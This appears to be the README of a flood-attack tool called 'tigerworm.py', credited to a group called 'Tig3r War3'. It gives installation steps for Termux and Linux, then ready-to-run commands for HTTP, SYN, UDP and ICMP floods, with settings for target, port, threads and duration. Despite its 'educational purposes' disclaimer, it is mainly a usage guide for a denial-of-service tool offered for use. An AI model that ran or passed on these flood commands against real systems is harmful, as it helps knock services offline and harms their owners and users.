Flood Attack Script 🚀

This script is designed for educational purposes to demonstrate flood attacks, including SYN, HTTP, UDP, and ICMP floods. **Use responsibly and only on systems you have permission to test.**

Installation 📥

On       

Termux 📱

1. Install Python:
    ```bash
    pkg install python
    ```

2. Install Required Libraries:
    ```bash
    pip install requests
    ```



On Linux OS 💻



1. Install Python 3.x:
    ```bash
    sudo apt update
    sudo apt install python3
    ```

2. Install Required Libraries:
    ```bash
    pip3 install requests
    ```

Usage 🛠️

Run the script using the following command-line arguments:

python3 tigerworm.py -s <target> -p <port> -t <threads> -d <duration> -f <flood_type>

Examples

HTTP Flood 🌐:
```bash
python3 tigerworm.py -s example.com -p 80 -t 5 -d 2 -f http


SYN Flood 🔄:
python3 tigerworm.py -s 192.168.1.1 -p 80 -t 10 -d 1 -f syn


UDP Flood 📦:
python3 tigerworm.py -s 192.168.1.1 -p 80 -t 5 -d 1 -f udp


ICMP Flood 📡:
python3 tigerworm.py -s 192.168.1.1 -d 1 -f icmp



License 📜
This script is provided as-is for educational purposes only. Unauthorized use may have legal consequences.

Contact 📬
For any questions or feedback, please contact the script's author.

Author: Tig3r Mat3 Junior
Team: Tig3r War3




